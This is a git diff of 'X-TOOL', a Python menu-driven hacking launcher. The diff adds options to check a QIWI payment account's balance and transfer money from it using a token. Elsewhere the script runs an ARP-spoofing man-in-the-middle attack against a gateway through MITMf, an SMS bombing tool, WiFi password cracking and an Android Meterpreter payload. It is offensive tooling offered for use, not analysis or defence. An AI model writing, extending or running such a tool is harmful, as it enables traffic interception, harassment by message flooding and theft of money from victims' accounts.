@@ -35,6 +35,8 @@ print("[5] Android Meterpeter Over Wan")
 print('[6] MITM Attack (Man in the middle Attack) (Using MITMf)')
 print('[7] Crack Wifi network password!')
 print('[8] SMS Mass Mailer')
+print('[9] QIWI Check Balance using token')
+print('[10] QIWI Transfer money using token')
 print('')
 query = input("[*] Choose exploit!:").lower()                                       
 if query.startswith('1'):
@@ -108,7 +110,7 @@ if query.startswith('6'):
 	os.system('netstat -rn')
 	time.sleep(3)
 	RouterIP = input('Enter Gateway IP!:')
-	MITM = ('python mitmf.py -i ') + (Interface) + (' --spoof --arp --gateway ') + (RouterIP) + (' --upsidedownternet')
+	MITM = ('cd MITMf && python mitmf.py -i ') + (Interface) + (' --spoof --arp --gateway ') + (RouterIP) + (' --upsidedownternet')
 	os.system(MITM)
 if query.startswith('7'):
 	print('You must put your dict in X-TOOL folder!')
@@ -121,6 +123,10 @@ if query.startswith('8'):
 	time.sleep(5)
 	os.system("cd && cd X-TOOL && cd TBomb/ && chmod +x * && ./TBomb.sh")
 	print("Messages Sended!")
+if query.startswith('9'):
+	os.system('cd && cd X-TOOL && python3 QiwiBalance.py')
+if query.startswith('10'):
+	os.system('cd && cd X-TOOL && python3 QiwiBablo.py')
 else:
 	print('')
 	print('[X] Sorry, You didnt choose options!')
